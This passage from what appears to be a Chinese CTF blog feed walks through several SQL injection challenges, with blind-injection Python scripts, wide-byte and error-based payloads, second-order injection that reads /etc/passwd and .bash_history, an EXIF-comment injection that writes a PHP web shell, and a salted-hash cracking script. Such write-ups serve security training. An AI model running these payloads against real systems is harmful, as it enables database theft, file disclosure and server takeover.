&#39;1</code>，注意这里判断响应时间的时候要用time库，平常用的<code>elapsed.total_seconds()</code>在这里好像不管用，测试后发现这个函数获得的是最后一次请求的响应时间，而题目中的register.php注册成功会重定向到login.php，于是会导致结果输出不出来，于是改用time库</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport timestr &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,&#123;&#125;_!@#$%^&amp;*.-&quot;url &#x3D; &quot;http:&#x2F;&#x2F;221e6a91-2118-48a2-832a-a910da7b4e1b.node3.buuoj.cn&#x2F;register.php&quot;header &#x3D; &#123;    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko&#x2F;20100101 Firefox&#x2F;74.0&quot;,    &quot;Accept&quot;: &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&quot;,    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;&#125;for i in range(0,50):    for j in str:        payload &#x3D; &quot;0&#39; or (case when (substr((select * from flag) from &#123;&#125; for 1 )&#x3D;&#39;&#123;&#125;&#39;) then sleep(3) else 1 end) or &#39;1&quot;.format(i,j)        #print(payload)        data &#x3D; &#123;            &quot;email&quot;:&quot;111@111&quot;,            &quot;username&quot;:payload,            &quot;password&quot;:&quot;aaa&quot;        &#125;        startTime&#x3D;time.time()        r &#x3D; requests.post(url,data&#x3D;data,headers&#x3D;header)        #print(r.status_code)        #print(r.text)        if time.time()-startTime&gt;1:            print(j,end &#x3D; &#39;&#39;)            break</code></pre><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="2020ichunqiu新春公益赛—easysqli-copy"><a href="#2020ichunqiu新春公益赛—easysqli-copy" class="headerlink" title="2020ichunqiu新春公益赛—easysqli_copy"></a>2020ichunqiu新春公益赛—easysqli_copy</h3><p><a href="https://www.freebuf.com/articles/web/216336.html">参考1</a> ，<a href="https://xz.aliyun.com/t/3950">参考2</a></p><p>界面代码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php     function check($str)    &#123;        if(preg_match(&#39;&#x2F;union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database&#x2F;i&#39;,$str,$matches))        &#123;            print_r($matches);            return 0;        &#125;        else        &#123;            return 1;        &#125;    &#125;    try    &#123;        $db &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;pdotest&#39;,&#39;root&#39;,&#39;******&#39;);    &#125;     catch(Exception $e)    &#123;        echo $e-&gt;getMessage();    &#125;    if(isset($_GET[&#39;id&#39;]))    &#123;        $id &#x3D; $_GET[&#39;id&#39;];    &#125;    else    &#123;        $test &#x3D; $db-&gt;query(&quot;select balabala from table1&quot;);        $res &#x3D; $test-&gt;fetch(PDO::FETCH_ASSOC);        $id &#x3D; $res[&#39;balabala&#39;];    &#125;    if(check($id))    &#123;        $query &#x3D; &quot;select balabala from table1 where 1&#x3D;?&quot;;        $db-&gt;query(&quot;set names gbk&quot;);        $row &#x3D; $db-&gt;prepare($query);        $row-&gt;bindParam(1,$id);        $row-&gt;execute();    &#125;</code></pre><p> <code>$db-&gt;query(&quot;set names gbk&quot;);</code>这个语句构成了宽字节注入，即可以利用<code>%d5&#39;</code>闭合单引号形成宽字节注入，闭合单引号后后面的语句就是可控的了，所以后面只需要构造注入语句绕过waf即可，过滤的绝大多数字符，于是这里使用<code>prepare</code>预编译注入</p><p>格式：<code>set @a=执行的语句;prepare ctftest from @a; execute ctftest;</code>，该格式支持十六进制编码和ascii编码注入，于是就可以进行绕过</p><p>于是就可以用该预编译注入+延时注入+布尔盲注来爆出所有内容</p><p>爆列Payload：<code>select if(ascii(mid((select group_concat(column_name,&#39;&#39;) from information_schema.columns where table_name=&#39;table1&#39;),&#123;&#125;,1))= &#123;&#125;,sleep(3),1)</code></p><p>爆字段payload：<code>select if(ascii(mid((select group_concat(fllllll4g,&#39;&#39;) from table1),&#123;&#125;,1))= &#123;&#125;,sleep(3),1)</code></p><p>写出盲注脚本：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;8e2a5a61db69418f8ebe1c973c4bdecfa176617cfa094611.changame.ichunqiu.com&#x2F;?id&#x3D;&quot;def str_to_hex(s):    return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;, &#39;&#39;) for c in s])for i in range(1,100):    for j in range(45,128):        d &#x3D; &quot;(This is Payload)&quot;.format(i,j)        payload &#x3D; str_to_hex(d)        a &#x3D; &quot;%df%27;set @a&#x3D;0x&#123;&#125;;prepare a from @a; execute a;&quot;.format(payload)        r &#x3D; requests.get(url+a)        if r.elapsed.total_seconds()&gt;1:            print(chr(j),end&#x3D;&#39;&#39;)            break</code></pre><p>得到<code>table1</code>表中的列：<code>balabala,eih@y,fllllll4g,bbb</code>,最终在<code>fllllll4g</code>列中得到flag</p><h3 id="安恒杯-新春祈福赛—BabySqliv2-0"><a href="#安恒杯-新春祈福赛—BabySqliv2-0" class="headerlink" title="安恒杯-新春祈福赛—BabySqliv2.0"></a>安恒杯-新春祈福赛—BabySqliv2.0</h3><p><strong>解题核心</strong>—————–异或注入，报错注入，宽字节注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/g86QP1C5ZsThjan.png" alt loading="lazy"></p><p>界面的上题一样，发现只要用admin账号登录，无论用什么密码都能登录进去，登进去后界面如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200202205759631.png" alt loading="lazy"></p><p>于是在登录界面测试，单引号注入无效，猜测转义了单引号，利用宽字节注入，果不其然，于是利用报错注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/4cPp1rotWQnUvew.png" alt loading="lazy"></p><p>文章参考：<a href="https://www.gem-love.com/websecurity/467.html">简析GXY_CTF “BabySqli v2.0”宽字节注入</a></p><p>报错注入有三种方法：floor()，extractvalue()，updatexml()，这里采用extractvalue()报错注入：</p><p>查库：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,(seselectlect(group_concat(database())))));--+</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/KDtnXxQcPvYRGV6.png" alt loading="lazy"></p><p>查表：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,(selselectect(group_concat(table_name))from(information_schema.tables)whewherere((table_schema)&#x3D;database()))));--+</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/YvlyLpUX7qZESNP.png" alt loading="lazy"></p><p>由此可知flag应该在f14g中</p><p>查字段：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,(selselectect(group_concat(column_name))from(information_schema.columns)whwhereere((table_name)&#x3D;char(102,49,52,103)))));--+</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/hIfBtkgzYT4qNOa.png" alt loading="lazy"></p><blockquote><p>注：这里应该是过滤了列的直接查询，用char()函数进行绕过即可</p></blockquote><p>解密MD5值后为id</p><p>id列查询：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,(selselectect group_concat(b80bb7740288fda1f201890375a60c8f) from f14g)))--+</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/9wQR4Un3pDref1W.png" alt loading="lazy"></p><p>还真全是id了，看大佬博客后发现居然还可以盲猜flag？？？</p><p>flag的MD5值为327a6c4304ad5938eaf0efb6cc3e53dc</p><p>flag列查询：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,(selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g)))--+</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/xoZzpbPdajKuqD3.png" alt loading="lazy"></p><p>base64解密后为“The first man name was k”。。。。。。。。。。</p><p>配合limit进行查询，在limit 22,1处发现flag</p><pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,(selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1)))--+</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/PXqxeEV3Hvp7cRw.png" alt loading="lazy"></p><p>解码后只显示前面的flag，应该是前端界面限制了字符串的显示</p><p>于是用到substr()函数进行字符串的截取：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,substr((selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),10,32)))--+</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Qo3SelyJVt6qbkM.png" alt loading="lazy"></p><p>去掉相同的拼合起来base64解码后即可得到flag</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="网鼎杯-2018—Comment"><a href="#网鼎杯-2018—Comment" class="headerlink" title="网鼎杯 2018—Comment"></a>网鼎杯 2018—Comment</h3><p>上来先扫描一波，扫到了<code>.git</code>，<code>index.php</code>，<code>login.php</code>，<code>git</code>源码泄露，用<code>Githack</code>工具进行恢复</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161036570.png" alt loading="lazy"></p><p>发现case后的直接break了，什么操作都没有，估计这份代码不全，使用<code>git</code>进行恢复</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161519874.png" alt="image-20200509161519874" loading="lazy"></p><p>找到历史commit版本，进行代码恢复，得到最终<code>write_do.php</code>源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;    header(&quot;Location: .&#x2F;login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;switch ($_GET[&#39;do&#39;])&#123;case &#39;write&#39;:    $category &#x3D; addslashes($_POST[&#39;category&#39;]);    $title &#x3D; addslashes($_POST[&#39;title&#39;]);    $content &#x3D; addslashes($_POST[&#39;content&#39;]);    $sql &#x3D; &quot;insert into board            set category &#x3D; &#39;$category&#39;,                title &#x3D; &#39;$title&#39;,                content &#x3D; &#39;$content&#39;&quot;;    $result &#x3D; mysql_query($sql);    header(&quot;Location: .&#x2F;index.php&quot;);    break;case &#39;comment&#39;:    $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);    $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;;    $result &#x3D; mysql_query($sql);    $num &#x3D; mysql_num_rows($result);    if($num&gt;0)&#123;    $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;];    $content &#x3D; addslashes($_POST[&#39;content&#39;]);    $sql &#x3D; &quot;insert into comment            set category &#x3D; &#39;$category&#39;,                content &#x3D; &#39;$content&#39;,                bo_id &#x3D; &#39;$bo_id&#39;&quot;;    $result &#x3D; mysql_query($sql);    &#125;    header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;);    break;default:    header(&quot;Location: .&#x2F;index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: .&#x2F;index.php&quot;);&#125;?&gt;</code></pre><p><code>write</code>操作对应发帖，<code>comment</code>操作对应评论操作，但是在进行这些操作的前提是要登录上，于是我们看到登录界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161906786.png" alt loading="lazy"></p><p>两个提示似乎在暗示这什么，于是对密码的三个*出处进行爆破，得到密码<code>zhangwei666</code>成功登录，来到发帖界面，首先我们看发帖操作，用<code>addslashes</code>函数对参数进行了过滤，说到<code>addslashes</code>引发的安全问题可以查看这篇文章：<a href="https://bbs.ichunqiu.com/thread-10899-1-1.html">https://bbs.ichunqiu.com/thread-10899-1-1.html</a></p><p>里面介绍了绕过<code>addslashes</code>函数的方法，但在这里似乎用不到，仔细观察代码，<code>addslashes</code>函数限制了我们对一些特殊符号的操作，使得sql语句能够正常的执行，但并没有改变插入到数据库中的数据，测试如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509163056815.png" alt loading="lazy"></p><p>可以看到并不会改变存入数据库中的内容，查询出里面的结果也是一样，于是我们再看到<code>commit</code>操作，里面的<code>mysql_fetch_array</code>函数在数据库中取出<code>category</code>字段中的内容，然后再直接进行了<code>insert into</code>存入评论数据的操作操作传入的参数<code>category</code>我们可，后面的<code>content</code>参数我们也可控于是就可以进行如下操作：</p><p>先传入<code>category</code>字段的值为<code>a&#39;,content=(select user()),/*</code>,前面的单引号虽然在存入数据库的过程中被转义了，但是数据库中华存的依旧是用来的内容，后面的取出来的时候也会将单引号原封不动的取出来，在进行<code>comment</code>的<code>insert into</code>操作时候，就会闭合前面的单引号，从而达到注入的目的，然后跟上的<code>content</code>值当然就是要进行<code>sql</code>注入查找数据的操作，然后再接上<code>/*</code>，这样我们后面再评论页面进行评论的时候传入<code>*/#</code>就能成功的和前面的闭合起来，总<code>payload</code>如下：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">insert into comment set category &#x3D; &#39;a&#39;,content&#x3D;(select user()),&#x2F;*&#39;,content &#x3D; &#39;*&#x2F;#&#39;,bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre><p>得到回显：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509164939746.png" alt loading="lazy"></p><p>尝试写马无果，应该是权限不够，然后再ctf数据库查到三个表<code>board,comment,user</code></p><p><code>user</code>表中有如下列</p><pre class="language-none"><code class="language-none">id,username,password,Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Create_user_priv,Event_priv,Trigger_priv,Create_tablespace_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_updates,max_connections,max_user_connections,plugin,authentication_string</code></pre><p><code>board</code>表中有如下列</p><pre class="language-none"><code class="language-none">id,category,title,content</code></pre><p><code>comment</code>表中有如下列</p><pre class="language-none"><code class="language-none">id,bo_id,category,content</code></pre><p>经过一番查找后并没有发现存在<code>flag</code>的内容，看来<code>flag</code>并没在数据库中，不在数据库中那只能在文件中了，于是进行文件读取操作，根目录下并没有<code>flag</code>，于是我们左试右试都没发现<code>flag</code>，于是读取<code>/etc/passwd</code></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; load_file(&#39;&#x2F;etc&#x2F;passwd&#39;),&#x2F;*</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509170854625.png" alt loading="lazy"></p><p><code>/etc/passwd</code>文件描述参考：<a href="http://www.suk1.top/2020/01/13/Linux_etc_passwd/#%E4%B8%BB%E7%9B%AE%E5%BD%95-%E5%92%8C-Shell">Linux passwd 文件详解</a></p><p>注意到最后一行，<code>www:x:500:500:www:/home/www:/bin/bash</code>www用户在<code>/home/www</code>的目录下进行了<code>/bin/bash</code>的<code>shell</code>操作，于是我们利用<code>.bash_history</code>查找用户使用过的历史命令</p><ul><li><code>.bash_history</code>：保存了当前用户使用过的历史命令,方便查找，参考：<a href="https://blog.csdn.net/caolaosanahnu/article/details/7601074">linux中Shell历史命令记录文件的路径是什么</a></li></ul><pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; load_file(&#39;&#x2F;home&#x2F;www&#x2F;.bash_history&#39;),&#x2F;*</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509171610258.png" alt loading="lazy"></p><p>可以到进行了如上操作，切换到<code>/tmp</code>目录下，解压<code>html.zip</code>的压缩包，删除压缩包，复制<code>html</code>目录及其子目录到<code>/var/www/html</code>目录下，然后删除了<code>.DS_Store</code>文件，开启<code>Apache</code>服务</p><ul><li><code>.DS_Store</code>：Mac OS 保存文件夹的自定义属性的隐藏文件</li></ul><p>这个过程看上去没毛病，但是中间漏了一点，<code>/tmp</code>目录下了<code>html</code>文件夹中的<code>.DS_Store</code>文件并没用被删除，于是我们尝试读取这个文件，直接读取在页面上回显并不完全</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172422699.png" alt loading="lazy"></p><p>于是通过<code>hex</code>方式进行读取</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; hex(load_file(&#39;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&#39;)),&#x2F;*</code></pre><p>得到一长串十六进制数字，放到网站上转文本</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172701095.png" alt loading="lazy"></p><p>可以看到应该存放<code>flag</code>的文件，进行读取</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&#39;),&#x2F;*</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172916732.png" alt loading="lazy"></p><p>成功拿到flag</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="安恒杯-新春祈福赛—BabySqli"><a href="#安恒杯-新春祈福赛—BabySqli" class="headerlink" title="安恒杯-新春祈福赛—BabySqli"></a>安恒杯-新春祈福赛—BabySqli</h3><p><strong>解题核心</strong>—————–MD5绕过</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/FUeKLit8HApfNOP.png" alt loading="lazy"></p><p>题目给出的提示：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/53qyMpFJAaSEcBz-1586920617685.png" alt loading="lazy"></p><p>随便登录后在前端HTML中都能看到这样一串字母</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--></span></code></pre><p>base32解码后得到</p><pre class="language-none"><code class="language-none">c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;</code></pre><p>base64解码后得到</p><pre class="language-sql" data-language="sql"><code class="language-sql">select * from user where username &#x3D; &#39;$name&#39;</code></pre><p>sqlmap测试后可以得到admin的密码MD5值，找不到原码</p><p>于是参考MD5绕过，参考：<a href="https://www.gem-love.com/websecurity/453.html">简析GXY_CTF “BabySqli v1.0″绕过md5比较</a></p><p>利用以下注入语句</p><pre class="language-sql" data-language="sql"><code class="language-sql">name: admin&#39; And 1&gt;2 union select &#39;1&#39;,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849bpw: 1</code></pre><p>注：</p><ul><li>根据得到的sql后台查询语句，需要用单引号闭合，故最后不用加单引号</li><li>union select后的查询当字符串使用需要加单引号，当然数字可以不加单引号</li><li>过滤了and可以用大写And绕过</li><li>1 的MD5值为c4ca4238a0b923820dcc509a6f75849b</li></ul><p>于是当前面的语句And 1&gt;2永不成立，联合查询后面的语句就会在数据库中查询显示出来</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/XHqfk2AmYUGvNyr-1586920623970.png" style="zoom:67%;" loading="lazy"><p>于是这时输入password=1即可绕过查询得到flag</p><h3 id="36D—WEB-你没见过的注入"><a href="#36D—WEB-你没见过的注入" class="headerlink" title="36D—WEB_你没见过的注入"></a>36D—WEB_你没见过的注入</h3><p>在<code>robots.txt</code>拿到可以直接重置管理员密码的界面<code>pwdreset.php</code>，然后再从前台登录进去，发现是一个文件上传的页面<code>main.php</code>， 界面没有做什么上传限制，但是在上传上去之后会跳转到显示文件列表的界面<code>filelist.php</code>，后台将文件名和后缀都改了，文件名应该是md5加盐后得到的一串字符串，后缀为zip文件，并且可以将文件直接下载下来，下载下来后压缩包打不开，用文本编辑器打开后里面的内容就是我们上传上去文件的内容，后台将其的名字和后缀都改了，测试绕过，无果</p><p>参考：<a href="https://www.gem-love.com/ctf/2283.html#你没见过的注入">你没见过的注入</a></p><p>再看到文件列表显示的界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506213728072.png" alt loading="lazy"></p><p>除了文件名之外后面还有一串类似文件格式一样的东西，详见上面大佬的博客吧，这里给出解题步骤：</p><p>这里考的是<code>EXIF</code>信息中<code>comment</code>字段注入，这个字段会存入数据库，<code>finfo-&gt;file()</code>再在后面输出这个信息，造成了sql注入漏洞，先去网上下载一个<code>exiftool</code>工具 ——&gt;  <a href="https://exiftool.org/">https://exiftool.org/</a></p><p>可以编辑图片的的<code>EXIF</code>信息</p><p>payload：</p><pre class="language-shell" data-language="shell"><code class="language-shell">.&#x2F;exiftool -overwrite_original -comment&#x3D;&quot;y1ng\&quot;&#39;);select 0x3C3F3D60245F504F53545B305D603B into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;#&quot; 1.jpg</code></pre><p><code>hex(&lt;?=$_POST[0];)</code>=<code>0x3C3F3D60245F504F53545B305D603B</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506215714097.png" alt loading="lazy"></p><p>然后直接上传到网站上去就可以拿shell了（这里png图片无效，不知道为啥）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506215937088.png" alt loading="lazy"></p><h3 id="Hack-lu-2017-FlatScience"><a href="#Hack-lu-2017-FlatScience" class="headerlink" title="Hack.lu-2017-FlatScience"></a>Hack.lu-2017-FlatScience</h3><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200517170522200.png" alt loading="lazy"></p><p>这个网站有很多的<code>pdf</code>文件可以下载，暂时没有什么线索</p><p>访问<code>robots.txt</code>得到<code>login.php</code>和<code>admin.php</code>两个登录界面，<code>admin.php</code>源码存在<code>hint：do not even try to bypass this</code>，<code>login.php</code>源码也存在<code>TODO: Remove ?debug-Parameter!</code>，于是访问<code>/login.php?debug</code>得到<code>login.php</code>的源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpob_start();?&gt;..................(HTML)&lt;?phpif(isset($_POST[&#39;usr&#39;]) &amp;&amp; isset($_POST[&#39;pw&#39;]))&#123;        $user &#x3D; $_POST[&#39;usr&#39;];        $pass &#x3D; $_POST[&#39;pw&#39;];        $db &#x3D; new SQLite3(&#39;..&#x2F;fancy.db&#39;);        $res &#x3D; $db-&gt;query(&quot;SELECT id,name from Users where name&#x3D;&#39;&quot;.$user.&quot;&#39; and password&#x3D;&#39;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#39;&quot;);    if($res)&#123;        $row &#x3D; $res-&gt;fetchArray();    &#125;    else&#123;        echo &quot;&lt;br&gt;Some Error occourred!&quot;;    &#125;    if(isset($row[&#39;id&#39;]))&#123;            setcookie(&#39;name&#39;,&#39; &#39;.$row[&#39;name&#39;], time() + 60, &#39;&#x2F;&#39;);            header(&quot;Location: &#x2F;&quot;);            die();    &#125;&#125;if(isset($_GET[&#39;debug&#39;]))highlight_file(&#39;login.php&#39;);?&gt;................(HTML)</code></pre><p>可以看到用的是<code>SQLite</code>数据库，并且可直接查询，未经过过滤，但是密码进行了加密，先看看里面有什么东西，网上查<code>sqlite</code>的语法，和其它数据库大同小异，过程如下：</p><p>查表：</p><pre class="language-sql" data-language="sql"><code class="language-sql">usr&#x3D;1&#39; union select name,name FROM sqlite_master WHERE type&#x3D;&#39;table&#39; limit 0,1--+&amp;pw&#x3D;111 </code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200517170020527.png" alt loading="lazy"></p><p>查表名及其对应的结构：</p><pre class="language-sql" data-language="sql"><code class="language-sql">usr&#x3D;1&#39; union select name,sql FROM sqlite_master WHERE type&#x3D;&#39;table&#39; limit 0,1--+&amp;pw&#x3D;111</code></pre><p>得到：<code>CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))</code>，可以看到有一个<code>hint</code>字段</p><p>再将内容查询出来：</p><pre class="language-sql" data-language="sql"><code class="language-sql">usr&#x3D;1&#39; union select name,(id&#x2F;name&#x2F;password) FROM Users limit (0&#x2F;1&#x2F;2),1--+&amp;pw&#x3D;111</code></pre><pre class="language-none"><code class="language-none">1,admin,3fab54a50e770d830c0416df817567662a9dc85c,my fav word in my fav paper?!2,fritze,54eae8935c90f467427f05e4ece82cf569f89507,my love is…?3,hansi,34b0bb7c304949f9ff2fc101eef0f048be10d3bd,the password is password</code></pre><p>表中只有以上三行字段内容，根据<code>hint</code>可知，应该是要在<code>fav paper</code>中找到一个词+<code>Salz</code>之后<code>sha1</code>得到的值为<code>34b0bb7c304949f9ff2fc101eef0f048be10d3bd</code>，这个单词应该就是<code>admin</code>的密码，应该就在前面的那些<code>paper</code>的<code>pdf</code>文件里，于是用<code>wget</code>命令将其全都下载下来：</p><pre class="language-bash" data-language="bash"><code class="language-bash">wget http:&#x2F;&#x2F;124.126.19.106:43631&#x2F; -r -np -nd -A .pdf</code></pre><p>再用脚本遍历所有<code>pdf</code>文件中的单词</p><pre class="language-python" data-language="python"><code class="language-python">from io import StringIOfrom pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreterfrom pdfminer.converter import TextConverterfrom pdfminer.layout import LAParamsfrom pdfminer.pdfpage import PDFPageimport sysimport stringimport osimport hashlibdef get_pdf():    return [&quot;..&#x2F;FlatScience&#x2F;&quot; + i for i in os.listdir(&quot;..&#x2F;FlatScience&#x2F;&quot;) if i.endswith(&quot;pdf&quot;)]def convert_pdf_2_text(path):    rsrcmgr &#x3D; PDFResourceManager()    retstr &#x3D; StringIO()    device &#x3D; TextConverter(rsrcmgr, retstr, laparams&#x3D;LAParams())    interpreter &#x3D; PDFPageInterpreter(rsrcmgr, device)    with open(path, &#39;rb&#39;) as fp:        for page in PDFPage.get_pages(fp, set()):            interpreter.process_page(page)        text &#x3D; retstr.getvalue()    device.close()    retstr.close()    return textdef find_password():    pdf_path &#x3D; get_pdf()    # print(pdf_path)    for i in pdf_path:        print(&quot;Searching word in &quot; + i)        pdf_text &#x3D; convert_pdf_2_text(i).split(&quot; &quot;)        for word in pdf_text:            sha1_password &#x3D; hashlib.sha1((word + &quot;Salz!&quot;).encode()).hexdigest()            if sha1_password &#x3D;&#x3D; &#39;3fab54a50e770d830c0416df817567662a9dc85c&#39;:                print(&quot;Find the password :&quot; + word)                exit()if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    find_password()</code></pre><p>最后跑出<code>password</code>为<code>ThinJerboa</code>，在<code>admin.php</code>登录即可得到<code>flag</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;联合查询注入&quot;&gt;&lt;a href=&quot;#联合查询注入&quot; class=&quot;headerlink&quot; title=&quot;联合查询注入&quot;&gt;&lt;/a&gt;联合查询注入&lt;/h2&gt;&lt;h3 id=&quot;极客大挑战—LoveSQL&quot;&gt;&lt;a href=&quot;#极客大挑战—LoveSQL&quot; class=&quot;he
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="SQL注入" scheme="https://www.extrader.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
